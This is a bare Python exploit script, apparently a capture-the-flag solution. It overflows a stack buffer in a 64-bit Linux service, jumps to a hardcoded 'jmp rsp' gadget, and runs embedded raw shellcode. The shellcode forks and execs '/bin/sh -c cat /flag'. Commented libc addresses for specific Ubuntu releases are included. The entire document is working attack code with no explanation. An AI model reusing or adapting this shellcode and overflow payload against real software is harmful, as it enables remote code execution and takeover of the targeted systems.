from struct import pack
import time
import sys

sc = "H\x8b\xecH\x8dd$\xd8H\x8d\x05\xa2\x00\x00\x00H\x8d\x08H\x8d\x05\x90\x00\x00\x00H\x89E\xd8H\x8d\x05\x82\x00\x00\x00H\x89E\xe0H\x89M\xe8j\x00\x8fE\xf0j9X\x0f\x05\x83\xf8\x00t\x02\xeb\x19H\x8bE\xd8H\x8dU\xd83\xc9\xe8\x1d\x00\x00\x00\xb8\xff\xff\xff\xff\xe8+\x00\x00\x00H\x8dU\xf83\xc9\xe8,\x00\x00\x00\x8bE\xf8\xe8\x18\x00\x00\x00VWUH\x8b\xecH\x8b\xf8j;XH\x8b\xf2H\x8b\xd1\x0f\x05\xc9_^\xc3H\x8b\xec\x8b\xf8j<X\x0f\x05\xc9\xc3VWUH\x8b\xec\x8b\xf8j=XH\x8b\xf2\x8b\xd1E3\xd2\x0f\x05\xc9_^\xc3-c\x00/bin/sh\x00cat /flag;\x00"

#system = 0x7ffff7a566d0 #16.10
#system = 0x7ffff7a53390 #16.04
#poprdi = 0x7ffff7a2f102
#rdi = 0x7fffffffe410
#jmprsp = 0x7ffff7a10a71 #lol, has a newline in it, that's nasty
jmprsp = 0x7ffff7a73a5c
payload = "\xcc"*0xc8 + pack("q", jmprsp) + sc

sys.stdout.write("2002\n" + payload + "\n")
